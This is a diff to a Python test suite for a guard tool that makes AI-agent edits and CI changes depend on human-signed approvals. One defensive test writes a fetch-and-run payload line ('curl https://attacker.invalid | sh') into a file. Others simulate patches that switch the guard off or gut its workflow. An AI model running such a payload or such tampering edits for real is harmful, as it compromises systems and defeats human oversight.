@@ -1,5 +1,3 @@
-import contextlib
-import io
 import json
 import os
 import shutil
@@ -9,8 +7,11 @@ import unittest
 from pathlib import Path
 from unittest.mock import patch
 
-from openguildkit.cli import main
+from openguildkit.decisions import record_digest
+from openguildkit.guard import HOOK_OUTCOMES, MODES, UNKNOWN_MODE, hook_answer
 from openguildkit.storage import write_json
+
+from tests.support import CapturedCli
 
 EXAMPLE = Path(__file__).resolve().parents[1] / "examples" / "request-status"
 TASK = "request-status"
@@ -18,24 +19,19 @@ GIT_ENV = {**os.environ, "GIT_AUTHOR_NAME": "t", "GIT_AUTHOR_EMAIL": "t@example.
            "GIT_COMMITTER_NAME": "t", "GIT_COMMITTER_EMAIL": "t@example.org"}
 
 
-class GuardTests(unittest.TestCase):
+class GuardTests(CapturedCli, unittest.TestCase):
     def setUp(self):
         temporary = tempfile.TemporaryDirectory()
         self.addCleanup(temporary.cleanup)
         self.root = Path(temporary.name)
 
-    def run_cli(self, *arguments, code=0, stdin=None):
-        stdout, stderr = io.StringIO(), io.StringIO()
-        replaced = patch("sys.stdin", io.StringIO(stdin)) if stdin is not None else contextlib.nullcontext()
-        with contextlib.redirect_stdout(stdout), contextlib.redirect_stderr(stderr), replaced:
-            result = main(["--project", str(self.root), *map(str, arguments)])
-        self.assertEqual(result, code, stderr.getvalue())
-        return stdout.getvalue(), stderr.getvalue()
-
-    def init(self, **extra):
+    def write_profile(self, **extra):
         profile = {**json.loads((EXAMPLE / "profile.json").read_text()), **extra}
         write_json(self.root / "profile.json", profile)
-        self.run_cli("init", "--answers", self.root / "profile.json")
+        return self.root / "profile.json"
+
+    def init(self, **extra):
+        self.run_cli("init", "--answers", self.write_profile(**extra))
 
     def approve_example(self):
         self.run_cli("task", "new", "--file", EXAMPLE / "brief.md", "--id", TASK)
@@ -97,7 +93,76 @@ class GuardTests(unittest.TestCase):
     def test_observe_mode_flags_without_blocking(self):
         self.init(guard="observe")
         output, _ = self.run_cli("guard", "--hook", "pre-edit", stdin=self.edit_input(self.root / "app.py"))
-        self.assertIn("Edit refused for", json.loads(output)["hookSpecificOutput"]["additionalContext"])
+        context = json.loads(output)["hookSpecificOutput"]["additionalContext"]
+        self.assertIn("flagged, not blocked", context)
+        self.assertIn("app.py", context)
+        self.assertNotIn("refused", context)
+        # What happened comes first, then what the project expects.
+        self.assertTrue(context.startswith("OpenGuildKit: Edit flagged, not blocked (guard: observe): app.py."), context)
+        self.assertLess(context.index("flagged"), context.index("wait for the person's approval"))
+
+    def test_the_answer_and_the_exit_code_say_the_same_thing_in_every_mode(self):
+        for mode in MODES:
+            for event in ("prompt", "pre-edit"):
+                for outcome in HOOK_OUTCOMES:
+                    with self.subTest(mode=mode, event=event, outcome=outcome):
+                        code, output, error = hook_answer(event, mode, outcome, "app.py")
+                        text = json.loads(output)["hookSpecificOutput"]["additionalContext"] if output else error
+                        if mode == "off" or outcome == "outside":
+                            self.assertEqual((code, output, error), (0, "", ""))
+                            continue
+                        blocks = event == "pre-edit" and mode == "enforce" and outcome != "covered"
+                        self.assertEqual(code, 2 if blocks else 0)
+                        self.assertEqual(bool(error), blocks)
+                        if mode == "observe":
+                            self.assertNotIn("refused", text)
+                        if event == "pre-edit" and outcome != "covered":
+                            self.assertIn("Edit refused" if blocks else "flagged, not blocked", text)
+
+    def test_an_unreadable_mode_refuses_and_says_why(self):
+        code, output, error = hook_answer("pre-edit", UNKNOWN_MODE, "unchecked", "the profile is not JSON")
+        self.assertEqual((code, output), (2, ""))
+        self.assertIn("Edit refused", error)
+        self.assertIn("cannot know its mode", error)
+
+    def test_every_mode_answers_a_real_edit_in_words_that_match_its_exit_code(self):
+        self.init()
+        project = self.root / ".openguildkit" / "project.json"
+        inputs = {"uncovered": self.edit_input(self.root / "app.py"),
+                  "protected": self.edit_input(project), "unchecked": "not json"}
+        for mode in MODES:
+            profile = json.loads(project.read_text(encoding="utf-8"))
+            write_json(project, {**profile, "guard": mode})
+            for outcome, stdin in inputs.items():
+                with self.subTest(mode=mode, outcome=outcome):
+                    code = 2 if mode == "enforce" else 0
+                    output, error = self.run_cli("guard", "--hook", "pre-edit", stdin=stdin, code=code)
+                    text = json.loads(output)["hookSpecificOutput"]["additionalContext"] if output else error
+                    self.assertEqual("refused" in text, mode == "enforce", text)
+                    self.assertEqual("not blocked" in text, mode == "observe", text)
+
+    def test_a_covered_edit_says_the_guard_does_not_compare_files_with_the_scope(self):
+        self.init(guard="observe")
+        self.approve_example()
+        output, _ = self.run_cli("guard", "--hook", "pre-edit", stdin=self.edit_input(self.root / "README.md"))
+        context = json.loads(output)["hookSpecificOutput"]["additionalContext"]
+        self.assertIn(TASK, context)
+        self.assertIn("does not compare", context)
+        self.assertNotIn("falls under", context)
+        self.assertIn("does not compare", self.run_cli("guard")[0])
+
+    def test_the_unsigned_approval_warning_shows_at_init_check_and_host_check_only(self):
+        _, error = self.run_cli("init", "--answers", self.write_profile(guard="enforce", host="claude-code"))
+        self.assertIn("not signed", error)
+        self.assertNotIn("not signed", self.run_cli("host", "apply")[1])
+        with patch("openguildkit.hosts.shutil.which", return_value="/opt/tools/openguildkit"):
+            self.assertIn("not signed", self.run_cli("host", "check")[1])
+        with patch("openguildkit.hosts.shutil.which", return_value="/opt/tools/openguildkit"):
+            self.assertIn("not signed", self.run_cli("check")[1])
+        with patch("openguildkit.hosts.shutil.which", return_value=None):
+            self.assertIn("not signed", self.run_cli("check", code=1)[1])
+        for command in (("task", "list"), ("guard",), ("sync",)):
+            self.assertNotIn("not signed", self.run_cli(*command)[1], command)
 
     def test_host_apply_installs_the_hooks(self):
         self.init(guard="enforce", host="claude-code")
@@ -112,6 +177,21 @@ class GuardTests(unittest.TestCase):
         self.assertEqual(report["board"], "enforced")
 
     @unittest.skipIf(shutil.which("git") is None, "needs git")
+    def test_ci_in_observe_says_an_uncovered_change_is_flagged_not_blocking(self):
+        self.branch_with_change(guard="observe")
+        text, _ = self.run_cli("guard", "--ci", "--base", "main")
+        self.assertIn("no exported decision", text)
+        self.assertIn("Flagged, not blocking", text)
+        self.git("checkout", "-q", "main")
+        profile = self.root / ".openguildkit" / "project.json"
+        profile.write_text(profile.read_text(encoding="utf-8").replace('"observe"', '"enforce"'), encoding="utf-8")
+        self.git("commit", "-q", "-am", "enforce")
+        self.git("checkout", "-q", "feature")
+        self.git("rebase", "-q", "main")
+        text, _ = self.run_cli("guard", "--ci", "--base", "main", code=1)
+        self.assertNotIn("not blocking", text)
+
+    @unittest.skipIf(shutil.which("git") is None, "needs git")
     def test_ci_requires_an_exported_decision_for_changes(self):
         def git(*args):
             subprocess.run(["git", "-C", str(self.root), *args], check=True, capture_output=True, env=GIT_ENV)
@@ -120,20 +200,22 @@ class GuardTests(unittest.TestCase):
         git("add", "-A")
         git("commit", "-q", "-m", "base")
         git("checkout", "-q", "-b", "feature")
+        self.approve_example()
         (self.root / "app.py").write_text("print('status')\n", encoding="utf-8")
         git("add", "app.py")
         git("commit", "-q", "-m", "change")
         result = json.loads(self.run_cli("guard", "--ci", "--base", "main", "--json", code=1)[0])
         self.assertIn("no exported decision", result["problems"][0])
 
-        self.approve_example()
         exported = self.run_cli("task", "export", TASK)[0].strip()
         record = json.loads((self.root / exported).read_text())
         self.assertNotIn("\"evidence\":", json.dumps(record))
+        self.assertEqual(record["files"], ["app.py"])
         git("add", exported)
         git("commit", "-q", "-m", "decision")
         result = json.loads(self.run_cli("guard", "--ci", "--base", "main", "--json")[0])
         self.assertEqual(result["decisions"], [TASK])
+        self.assertTrue(result["ok"])
 
     def test_enforce_refuses_edits_to_the_files_the_guard_relies_on(self):
         self.init(guard="enforce")
@@ -145,6 +227,37 @@ class GuardTests(unittest.TestCase):
         patch_input = json.dumps({"tool_name": "apply_patch", "tool_input": {
             "command": "*** Begin Patch\n*** Update File: .openguildkit/project.json\n@@\n-  \"guard\": \"enforce\"\n+  \"guard\": \"off\"\n"}})
         self.run_cli("guard", "--hook", "pre-edit", stdin=patch_input, code=2)
+
+    def test_enforce_refuses_the_signers_the_alert_register_and_the_project_catalog_without_an_approved_task(self):
+        (self.root / "keys").mkdir()
+        (self.root / "keys" / "allowed_signers").write_text("pat@example.org ssh-ed25519 AAAA\n", encoding="utf-8")
+        self.init(guard="enforce", approval={"mode": "signed", "allowed_signers": "keys/allowed_signers",
+                                             "approvers": ["pat@example.org"]})
+        paths = ("keys/allowed_signers", ".openguildkit/alerts.json", ".openguildkit/catalog/boards/security.json",
+                 ".openguildkit/catalog/tools/issue-tracking.json")
+        for relative in paths:
+            with self.subTest(path=relative):
+                _, error = self.run_cli("guard", "--hook", "pre-edit", stdin=self.edit_input(relative), code=2)
+                self.assertIn(f"Edit refused for: {relative}" if "catalog" in relative or "alerts" in relative
+                              else f"{relative} lists the keys that may sign approvals", error)
+        output, _ = self.run_cli("guard", "--hook", "pre-edit", stdin=self.edit_input(".openguildkit/answers.json"))
+        self.assertEqual(output, "")
+
+    def test_an_approved_task_covers_the_catalog_and_the_alert_register_never_the_signers(self):
+        (self.root / "allowed_signers").write_text("pat@example.org ssh-ed25519 AAAA\n", encoding="utf-8")
+        self.init(guard="enforce", approval={"mode": "signed", "allowed_signers": "allowed_signers",
+                                             "approvers": ["pat@example.org"]})
+        approval = {"task": "t1", "brief": "Add a board", "approved_at": "2026-11-22T09:00:00+00:00", "stale": False}
+        with patch("openguildkit.guard.covering_approvals", return_value=[approval]):
+            for relative in (".openguildkit/alerts.json", ".openguildkit/catalog/boards/security.json"):
+                self.run_cli("guard", "--hook", "pre-edit", stdin=self.edit_input(relative))
+            _, error = self.run_cli("guard", "--hook", "pre-edit", stdin=self.edit_input(self.root / "ALLOWED_SIGNERS"),
+                                    code=2)
+        self.assertIn("only the person changes it", error)
+        profile = self.root / ".openguildkit" / "project.json"
+        write_json(profile, {**json.loads(profile.read_text(encoding="utf-8")), "guard": "observe"})
+        output, _ = self.run_cli("guard", "--hook", "pre-edit", stdin=self.edit_input("allowed_signers"))
+        self.assertIn("Edit flagged, not blocked", json.loads(output)["hookSpecificOutput"]["additionalContext"])
 
     def test_observe_reports_an_edit_to_the_guard_files_and_lets_it_through(self):
         self.init(guard="observe")
@@ -176,8 +289,10 @@ class GuardTests(unittest.TestCase):
         (self.root / ".openguildkit" / "project.json").write_text("{", encoding="utf-8")
         _, error = self.run_cli("guard", "--hook", "pre-edit", stdin=self.edit_input(self.root / "app.py"), code=2)
         self.assertIn("could not check this edit", error)
+        self.assertIn("cannot know its mode", error)
         output, _ = self.run_cli("guard", "--hook", "prompt", stdin="")
         self.assertIn("could not run", json.loads(output)["hookSpecificOutput"]["additionalContext"])
+        self.assertIn("cannot know its mode", json.loads(output)["hookSpecificOutput"]["additionalContext"])
 
     def test_observe_reports_an_edit_the_guard_cannot_check_and_lets_it_through(self):
         self.init(guard="observe")
@@ -224,6 +339,24 @@ class GuardTests(unittest.TestCase):
         self.assertNotIn("Traceback", error)
 
     @unittest.skipIf(shutil.which("git") is None, "needs git")
+    def test_the_first_pull_request_explains_why_nothing_is_enforced_and_what_comes_next(self):
+        self.git("init", "-q", "-b", "main")
+        (self.root / "README.md").write_text("Portal\n", encoding="utf-8")
+        self.git("add", "-A")
+        self.git("commit", "-q", "-m", "before the profile")
+        self.git("checkout", "-q", "-b", "feature")
+        self.init(guard="observe")
+        self.git("add", "-A")
+        self.git("commit", "-q", "-m", "add the profile")
+        result = self.ci()
+        self.assertEqual(result["mode"], "off")
+        note = result["problems"][0]
+        self.assertIn("expected", note)
+        self.assertIn('"guard": "observe"', note)
+        text, _ = self.run_cli("guard", "--ci", "--base", "main")
+        self.assertIn("once the profile is merged", text)
+
+    @unittest.skipIf(shutil.which("git") is None, "needs git")
     def test_ci_reads_the_rules_from_the_base_revision(self):
         self.branch_with_change(guard="enforce")
         profile = self.root / ".openguildkit" / "project.json"
@@ -238,7 +371,7 @@ class GuardTests(unittest.TestCase):
         self.branch_with_change(guard="enforce")
         profile_path = self.root / ".openguildkit" / "project.json"
         profile = json.loads(profile_path.read_text(encoding="utf-8"))
-        profile["conventions"] = ["New rule in the branch."]
+        profile["checks"] = ["python -m pytest"]
         write_json(profile_path, profile)
         self.run_cli("sync")
         self.approve_example()
@@ -268,7 +401,11 @@ class GuardTests(unittest.TestCase):
     def test_a_decision_already_on_the_base_does_not_cover_new_changes(self):
         self.git("init", "-q", "-b", "main")
         self.init(guard="enforce")
+        self.git("add", "-A")
+        self.git("commit", "-q", "-m", "base")
         self.approve_example()
+        (self.root / "README.md").write_text("Status page\n", encoding="utf-8")
+        self.git("add", "README.md")
         self.run_cli("task", "export", TASK)
         self.git("add", "-A")
         self.git("commit", "-q", "-m", "base with a decision")
@@ -277,11 +414,85 @@ class GuardTests(unittest.TestCase):
         self.git("add", "app.py")
         self.git("commit", "-q", "-m", "change")
         self.assertIn("no exported decision", self.ci(code=1)["problems"][0])
-        record = self.root / ".openguildkit" / "decisions" / f"{TASK}.json"
-        exported = json.loads(record.read_text())
-        exported["brief"] = "Reused for other work."
-        self.commit_record(f"{TASK}.json", exported)
-        self.assertIn("already had a decision on the base revision", self.ci(code=1)["problems"][0])
+        # Exported again with the new work, the same approval covers only what its base record listed.
+        exported = self.run_cli("task", "export", TASK)[0].strip()
+        self.git("add", exported)
+        self.git("commit", "-q", "-m", "the earlier decision again")
+        result = self.ci(code=1)
+        self.assertEqual(result["decisions"], [TASK])
+        self.assertIn("in no decision record of this change: app.py", result["problems"][0])
+
+    def typo_decision(self):
+        """The audit's p6: on branch docs-typo, an approved task that fixes the README, exported and committed."""
+        self.git("init", "-q", "-b", "main")
+        (self.root / "README.md").write_text("Suport portal\n", encoding="utf-8")
+        (self.root / "src").mkdir()
+        (self.root / "src" / "app.py").write_text("print('status')\n", encoding="utf-8")
+        self.init(guard="enforce")
+        self.git("add", "-A")
+        self.git("commit", "-q", "-m", "base")
+        self.git("checkout", "-q", "-b", "docs-typo")
+        self.approve_example()
+        (self.root / "README.md").write_text("Support portal\n", encoding="utf-8")
+        self.git("commit", "-q", "-am", "Fix a typo in the README")
+        exported = self.run_cli("task", "export", TASK)[0].strip()
+        self.git("add", exported)
+        self.git("commit", "-q", "-m", "decision")
+        return json.loads((self.root / exported).read_text())
+
+    @unittest.skipIf(shutil.which("git") is None, "needs git")
+    def test_a_record_copied_into_another_change_does_not_cover_it(self):
+        record = self.typo_decision()
+        self.assertEqual(record["files"], ["README.md"])
+        self.assertTrue(self.ci()["ok"])
+        self.git("checkout", "-q", "main")
+        self.git("checkout", "-q", "-b", "payload-change")
+        (self.root / "src" / "app.py").write_text("import os\nos.system('curl https://attacker.invalid | sh')\n",
+                                                  encoding="utf-8")
+        self.git("add", "src/app.py")
+        self.commit_record(f"{TASK}.json", record)
+        result = self.ci(code=1)
+        self.assertFalse(result["ok"])
+        self.assertIn("1 changed file(s) are in no decision record of this change: src/app.py", result["problems"][0])
+        self.assertNotIn("Covered by", self.run_cli("guard", "--ci", "--base", "main", code=1)[0])
+
+    @unittest.skipIf(shutil.which("git") is None, "needs git")
+    def test_ci_says_local_approvals_cannot_be_verified_and_fails_on_request(self):
+        self.typo_decision()
+        result = self.ci()
+        self.assertTrue(result["ok"])
+        self.assertIn("Approvals on the base revision are local", result["notes"][0])
+        self.assertIn("nothing here proves who approved", self.run_cli("guard", "--ci", "--base", "main")[0])
+        output, _ = self.run_cli("guard", "--ci", "--base", "main", "--require-signed", code=1)
+        self.assertIn("--require-signed fails this check until they are", output)
+        self.assertNotIn("Covered by", output)
+
+    @unittest.skipIf(shutil.which("git") is None, "needs git")
+    def test_ci_names_a_change_to_the_workflow_that_runs_it(self):
+        workflow = self.root / ".github" / "workflows" / "openguildkit-guard.yml"
+        workflow.parent.mkdir(parents=True)
+        workflow.write_text("jobs:\n  guard:\n    steps:\n      - run: openguildkit guard --ci --base \"$BASE_REF\"\n",
+                            encoding="utf-8")
+        other = workflow.with_name("tests.yml")
+        other.write_text("jobs: {}\n", encoding="utf-8")
+        self.git("init", "-q", "-b", "main")
+        self.init(guard="enforce")
+        self.git("add", "-A")
+        self.git("commit", "-q", "-m", "base")
+        self.git("checkout", "-q", "-b", "feature")
+        self.approve_example()
+        workflow.write_text("jobs:\n  guard:\n    steps:\n      - run: echo skipped\n", encoding="utf-8")
+        other.write_text("jobs: {lint: {}}\n", encoding="utf-8")
+        self.git("commit", "-q", "-am", "edit the workflows")
+        self.git("add", self.run_cli("task", "export", TASK)[0].strip())
+        self.git("commit", "-q", "-m", "decision")
+        result = self.ci()
+        self.assertTrue(result["ok"])
+        self.assertIn("This change edits .github/workflows/openguildkit-guard.yml, which runs this check", result["notes"][0])
+        self.assertNotIn("tests.yml", result["notes"][0])
+        self.assertIn("CODEOWNERS", self.run_cli("guard", "--ci", "--base", "main")[0])
+        with patch.dict(os.environ, {"GITHUB_WORKFLOW_REF": "acme/portal/.github/workflows/tests.yml@refs/pull/7/merge"}):
+            self.assertIn("openguildkit-guard.yml, .github/workflows/tests.yml", self.ci()["notes"][0])
 
     @unittest.skipIf(shutil.which("git") is None or shutil.which("ssh-keygen") is None, "needs git and ssh-keygen")
     def test_ci_verifies_signed_decisions_against_the_base_signers(self):
@@ -303,6 +514,8 @@ class GuardTests(unittest.TestCase):
                         str(keys / "decision.json")], check=True, capture_output=True)
         self.run_cli("task", "decide", TASK, "--approve", "--by", "Camille", "--reason", "Agreed",
                      "--signer", "camille@example.org", "--signature", keys / "decision.json.sig")
+        (self.root / "app.py").write_text("print('status page')\n", encoding="utf-8")
+        self.git("commit", "-q", "-am", "the approved work")
         record = json.loads((self.root / self.run_cli("task", "export", TASK)[0].strip()).read_text())
         self.commit_record(f"{TASK}.json", record)
         self.assertEqual(self.ci()["decisions"], [TASK])
@@ -311,8 +524,12 @@ class GuardTests(unittest.TestCase):
 
         (self.root / "allowed_signers").write_text("camille@example.org ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIK\n", encoding="utf-8")
         self.git("commit", "-q", "-am", "swap the signers")
-        self.assertEqual(self.ci()["decisions"], [TASK])
+        swapped = self.ci(code=1)
+        self.assertEqual(swapped["decisions"], [TASK])
+        self.assertIn("in no decision record of this change: allowed_signers", swapped["problems"][0])
         unsigned = {**record, "decision": {key: value for key, value in record["decision"].items() if key != "signature"}}
+        # Whoever removes the signature can recompute the record's own digest; the signature check still refuses it.
+        unsigned["record_sha256"] = record_digest(unsigned)
         self.commit_record(f"{TASK}.json", unsigned)
         self.assertIn("not signed", self.ci(code=1)["problems"][0])
 
